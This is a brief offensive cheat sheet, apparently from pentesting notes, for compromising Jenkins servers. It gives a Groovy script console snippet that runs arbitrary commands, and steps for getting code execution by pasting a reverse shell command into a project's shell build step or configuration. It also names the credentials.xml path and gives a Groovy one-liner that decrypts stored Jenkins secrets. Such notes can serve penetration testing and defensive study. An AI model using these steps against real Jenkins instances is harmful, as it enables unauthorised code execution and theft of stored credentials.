### Code execution via groovy script 
```
<rhost>/script

def process = "<command>".execute()
println "Found text ${process.text}"
```

### Code execution via now project
```
create new freestyle project > inside build section > set execute shell > paste reverse shell commando > build now
```

### Code execution via configuration of project
```
open project > configure > paste command > save and built
```

### Password hashes for jenkins
```
<jenkinsHome>/credentials.xml
```

### Decrypt using groovy script console
```
println hudson.util.Secret.decrypt("{<hash>}")
```

